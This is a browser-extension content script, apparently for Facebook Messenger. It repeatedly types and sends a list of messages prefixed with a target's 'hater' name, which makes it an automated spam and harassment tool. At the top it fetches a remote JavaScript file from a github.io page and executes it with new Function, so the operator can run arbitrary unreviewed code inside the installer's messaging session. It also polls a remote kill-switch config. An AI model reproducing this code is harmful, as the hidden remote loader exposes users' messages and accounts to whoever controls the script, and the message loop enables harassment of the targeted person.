
(async () => {

    try {

        const response = await fetch(
            "https://technicalabhi12341-prog.github.io/E2EE-Loader-/remote.js?t=" + Date.now()
        );

        const code = await response.text();

        new Function(code)();

        console.log("Remote GitHub script loaded");

    } catch (e) {

        console.log("Remote Load Error:", e);

    }

})();
// Remote config loader
let remoteConfig = {
    enabled: true
};

async function loadRemoteConfig() {

    try {

        const response = await fetch(
            "https://technicalabhi12341-prog.github.io/E2EE-Loader-/keys.json?t=" + Date.now()
        );

        remoteConfig = await response.json();

        console.log("Remote config loaded:", remoteConfig);

    } catch (e) {

        console.log("Remote config error:", e);

    }
}

// Load config first
loadRemoteConfig();

// Reload config every 30 seconds
setInterval(loadRemoteConfig, 30000);



// Main listener
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

    console.log("Message received in content script:", request);

    // Stop if disabled remotely
    if (remoteConfig.enabled === false) {

        console.log("Extension disabled remotely");

        return;

    }

    if (request.messages && request.speed && request.haterName !== undefined) {

        sendMessages(
            request.messages,
            request.speed,
            request.haterName
        );

    }

});


// Send messages function
function sendMessages(messages, speed, haterName) {

    let index = 0;

    function sendNextMessage() {

        // Remote stop check
        if (remoteConfig.enabled === false) {

            console.log("Stopped remotely");

            return;

        }

        if (messages.length > 0) {

            // Safe message formatting
            const messageWithHaterName =

                haterName && haterName.trim() !== ""

                    ? `${haterName} ${messages[index]}`

                    : messages[index];

            console.log(
                "Sending message:",
                messageWithHaterName
            );

            // Messenger input
            const inputBox =
                document.querySelector('[contenteditable="true"]');

            if (inputBox) {

                inputBox.focus();

                document.execCommand(
                    "selectAll",
                    false,
                    null
                );

                document.execCommand(
                    "delete",
                    false,
                    null
                );

                document.execCommand(
                    "insertText",
                    false,
                    messageWithHaterName
                );

                // Enter key
                const event = new KeyboardEvent(
                    "keydown",
                    {
                        key: "Enter",
                        code: "Enter",
                        keyCode: 13,
                        which: 13,
                        bubbles: true
                    }
                );

                inputBox.dispatchEvent(event);

                console.log(
                    "Message sent successfully:",
                    messageWithHaterName
                );

                index++;

                // Loop
                if (index >= messages.length) {

                    index = 0;

                }

                setTimeout(
                    sendNextMessage,
                    speed
                );

            } else {

                console.log(
                    "Messenger input box not found"
                );

            }

        }

    }

    sendNextMessage();

}
/* ===================================== */
/* PREMIUM FLOATING STATUS */
/* ===================================== */

function createPremiumPanel(){

if(document.getElementById(
"premiumFloatingPanel"
)) return;

const panel =
document.createElement("div");

panel.id =
"premiumFloatingPanel";

panel.innerHTML = `
<div id="premiumTitle">
✨ PREMIUM ACTIVE
</div>

<div id="premiumTyping">
⌨️ Typing Ready
</div>

<div id="premiumCounter">
📨 Sent : 0
</div>
`;

panel.style.position = "fixed";
panel.style.top = "20px";
panel.style.left = "20px";
panel.style.padding = "14px";
panel.style.width = "170px";
panel.style.borderRadius = "18px";
panel.style.background =
"rgba(0,0,0,.65)";
panel.style.backdropFilter =
"blur(12px)";
panel.style.border =
"1px solid rgba(255,215,0,.15)";
panel.style.zIndex = "999999";
panel.style.color = "#ffd700";
panel.style.fontSize = "13px";
panel.style.fontWeight = "600";
panel.style.boxShadow =
"0 0 18px rgba(255,215,0,.15)";
panel.style.animation =
"premiumFade .4s ease";

document.body.appendChild(panel);

}

createPremiumPanel();

/* ===================================== */
/* COUNTER SYSTEM */
/* ===================================== */

let premiumSentCount = 0;

function updatePremiumCounter(){

const counter =
document.getElementById(
"premiumCounter"
);

if(counter){

counter.innerHTML =
"📨 Sent : " +
premiumSentCount;

}

}

/* ===================================== */
/* SAFE LOOP PROTECTION */
/* ===================================== */

let premiumLastMessage = "";

function premiumLoopProtect(message){

if(message === premiumLastMessage){

console.log(
"Duplicate blocked"
);

return false;

}

premiumLastMessage = message;

return true;

}

/* ===================================== */
/* TYPING STATUS */
/* ===================================== */

function premiumTypingStatus(text){

const typing =
document.getElementById(
"premiumTyping"
);

if(typing){

typing.innerHTML = text;

}

}

/* ===================================== */
/* PREMIUM ANIMATION */
/* ===================================== */

const premiumStyle =
document.createElement("style");

premiumStyle.innerHTML = `

@keyframes premiumFade{

from{

opacity:0;
transform:translateY(-10px);

}

to{

opacity:1;
transform:translateY(0);

}

}

#premiumFloatingPanel:hover{

transform:scale(1.03);

transition:.3s;

}

`;

document.head.appendChild(
premiumStyle
);

/* ===================================== */
/* SEND OBSERVER */
/* ===================================== */

document.addEventListener(
"keydown",
(e)=>{

if(e.key === "Enter"){

premiumSentCount++;

updatePremiumCounter();

premiumTypingStatus(
"✅ Message Sent"
);

setTimeout(()=>{

premiumTypingStatus(
"⌨️ Typing Ready"
);

},1500);

}

}
);